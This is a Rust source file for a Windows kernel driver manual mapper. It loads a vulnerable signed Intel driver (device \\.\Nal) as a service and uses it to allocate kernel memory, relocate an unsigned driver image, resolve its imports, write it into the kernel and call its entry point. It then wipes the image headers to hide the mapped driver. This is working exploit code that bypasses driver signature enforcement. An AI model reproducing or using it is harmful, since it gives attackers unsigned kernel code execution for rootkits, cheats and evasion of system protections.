use core::panic;
use std::{intrinsics::transmute};

use winapi::{
    shared::{
        ntdef::NTSTATUS,
    },
    um::{
        errhandlingapi::GetLastError,
        fileapi::{CreateFileA, OPEN_EXISTING},
        handleapi::CloseHandle,
        memoryapi::{VirtualAlloc, VirtualFree},
        winnt::{
            FILE_ATTRIBUTE_NORMAL, GENERIC_READ, GENERIC_WRITE, HANDLE, IMAGE_NT_HEADERS, IMAGE_NT_OPTIONAL_HDR64_MAGIC,
            IMAGE_REL_BASED_DIR64, MEM_COMMIT, MEM_RELEASE, MEM_RESERVE, PAGE_READWRITE, PIMAGE_SECTION_HEADER,
        },
    },
};

use crate::{pe, service, util};

pub fn load_service(name: &str) -> HANDLE {
    unsafe {
        let temp_path = util::get_temporary_folder_path();

        let mut driver_path = temp_path.as_os_str().to_os_string();
        driver_path.push(name);

        // export driver from buffer
        if !util::create_driver_file(&driver_path.to_str().expect("Couldn't conver to Rust str!").to_string()) {
            println!(
                "Failed to create service file... return code: {}",
                GetLastError()
            );
            panic!("See last output for more info.");
        }

        if !util::create_and_start_service(&driver_path.to_str().expect("Couldn't conver to Rust str!").to_string()) {
            println!(
                "Failed to create or start service... return code: {}",
                GetLastError()
            );
            panic!("See last output for more info.");
        }

        let res = CreateFileA(
            "\\\\.\\Nal\0".as_ptr() as _,
            GENERIC_READ | GENERIC_WRITE,
            0,
            std::ptr::null_mut(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            std::ptr::null_mut(),
        );

        res
    }
}

pub fn unload_service(service: HANDLE, name: &str) -> bool {
    unsafe {
        CloseHandle(service);
        util::delete_and_stop_service(name);

        let path_to_driver = util::get_path_to_driver();

        match std::fs::remove_file(path_to_driver) {
            Ok(_) => (),
            Err(e) => println!("Failed to delete driver after unloading... {}", e),
        }

        true
    }
}

pub fn relocate_image_by_delta(relocations: Vec<pe::RelocationInfo>, delta: u64) {
    relocations.iter().for_each(|relocation| {
        for i in 0..relocation.count {
            let _type = unsafe { relocation.item.offset(i as isize).read() } >> 12;
            let offset = unsafe { relocation.item.offset(i as isize).read() } & 0xFFF;

            if _type == IMAGE_REL_BASED_DIR64 {
                unsafe {
                    *((relocation.address + offset as u64) as *mut u64) += delta;
                };
            }
        }
    })
}

pub fn resolve_imports(service: HANDLE, mut imports: Vec<pe::ImportInfo>) -> bool {
    unsafe {
        imports.iter_mut().for_each(|import_info| {
            let current_import_address =
                util::get_kernel_module_address(import_info.name.to_owned());

            if current_import_address == 0 {
                println!(
                    "Required module {} was not found! Last error code: {}",
                    import_info.name,
                    GetLastError()
                );
                panic!("See last logs for panic!");
            }

            // import_info.function_info.iter_mut().for_each(|function_info| {
            //     let function_address = util::get_kernel_module_export(service, current_import_address as _, &function_info.name);

            //     if function_address == 0 {
            //         println!("Failed to resolve import {} from {}! Last error code: {}", function_info.name, import_info.name, GetLastError());
            //         panic!("See last logs for panic!");
            //     }

            //     function_info.address = function_address as _;
            // })
            // ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ lol!

            for function_info in &mut import_info.function_info {
                let function_address = util::get_kernel_module_export(
                    service,
                    current_import_address as _,
                    &function_info.name,
                );

                if function_address == 0 {
                    println!(
                        "Failed to resolve import {} from {}! Last error code: {}",
                        function_info.name,
                        import_info.name,
                        GetLastError()
                    );
                    panic!("See last logs for panic!");
                }

                function_info.get_address().write(function_address);
            }
        });
    }
    true
}

pub fn image_first_section(header: *mut IMAGE_NT_HEADERS) -> PIMAGE_SECTION_HEADER {
    unsafe {
        let field_offset =
            || (&(*header).OptionalHeader as *const _ as usize - header as usize) as usize;

        ((header as usize + field_offset()) + (*header).FileHeader.SizeOfOptionalHeader as usize)
            as PIMAGE_SECTION_HEADER
    }
}

pub fn load_image_into_kernel(service: HANDLE, file: String) -> u64 {
    unsafe {
        let mut buffer = Vec::new();

        if !util::read_file_to_memory(&file, &mut buffer) {
            println!(
                "Failed to read file to memory! Last error code: {}",
                GetLastError()
            );
            panic!("See last logs for panic!");
        }

        let image_headers = pe::get_nt_headers(buffer.as_mut_ptr());

        if image_headers.is_null() {
            println!("Invalid image headers! Last error code: {}", GetLastError());
            panic!("See last logs for panic!");
        }

        if (*image_headers).OptionalHeader.Magic != IMAGE_NT_OPTIONAL_HDR64_MAGIC {
            println!("Driver is not 64-bit! Last error code: {}", GetLastError());
            panic!("See last logs for panic!")
        }

        let image_size = (*image_headers).OptionalHeader.SizeOfImage;

        if image_size == 0 {
            println!(
                "Invalid driver image size! Last error code: {}",
                GetLastError()
            );
            panic!("See last logs for panic!")
        }

        let local_image_memory = VirtualAlloc(
            std::ptr::null_mut(),
            image_size as _,
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        );

        if local_image_memory.is_null() {
            println!(
                "Failed to allocate local image memory! Last error code: {}",
                GetLastError()
            );
            panic!("See last logs for panic!")
        }

        println!("Local driver memory allocated at: {:p}", local_image_memory);

        std::ptr::copy(
            buffer.as_ptr(),
            local_image_memory as _,
            (*image_headers).OptionalHeader.SizeOfHeaders as usize,
        );
        println!("Copied driver headers into local image memory");

        let current_image_section = image_first_section(image_headers);

        for i in 0..(*image_headers).FileHeader.NumberOfSections {
            let local_section = (local_image_memory as usize
                + (*current_image_section.offset(i as isize)).VirtualAddress as usize)
                as *mut i8;
            std::ptr::copy(
                (buffer.as_ptr() as usize
                    + (*current_image_section.offset(i as isize)).PointerToRawData as usize)
                    as *const i8,
                local_section,
                (*current_image_section.offset(i as isize)).SizeOfRawData as usize,
            )
        }

        println!("Copied image sections into local image memory.");

        let kernel_image_memory = service::allocate_pool(service, 0, image_size as _);

        if kernel_image_memory == 0 {
            println!(
                "Failed to allocate kernel image memory! Last error code: {}",
                GetLastError()
            );
            panic!("See last logs for panic!")
        }

        println!(
            "Kernel image memory allocated at {:p}",
            kernel_image_memory as *mut i8
        );

        relocate_image_by_delta(
            pe::get_relocations(local_image_memory as _).expect("Couldn't get relocations"),
            kernel_image_memory - (*image_headers).OptionalHeader.ImageBase,
        );

        let imports = pe::get_imports(local_image_memory as _).expect("Couldn't get imports!");

        if !resolve_imports(service, imports) {
            println!(
                "Failed to _resolve_ imports! Last error code: {}",
                GetLastError()
            );
            panic!("See last logs for panic!")
        }

        if !service::write_memory(
            service,
            kernel_image_memory,
            local_image_memory as _,
            image_size as _,
        ) {
            println!(
                "Failed to write local image to kernel image! Last error code: {}",
                GetLastError()
            );
            panic!("See last logs for panic!");
        }

        VirtualFree(local_image_memory, 0, MEM_RELEASE);

        let entry_point =
            kernel_image_memory + (*image_headers).OptionalHeader.AddressOfEntryPoint as u64;
        println!(
            "Calling image entry point at {:p}",
            entry_point as *const i8
        );

        let mut status: NTSTATUS = 0;

        if !util::call_kernel_fn(
            service,
            &mut |entry_point_address| {
                status = transmute::<*mut usize, unsafe extern "system" fn() -> NTSTATUS>(
                    entry_point_address,
                )();
                true
            },
            entry_point,
        ) {
            println!(
                "Failed to call image entry point! Last error code: {}",
                GetLastError()
            );
        }

        service::set_memory(
            service,
            kernel_image_memory,
            0,
            (*image_headers).OptionalHeader.SizeOfHeaders as _,
        );
        return kernel_image_memory;
    }
}
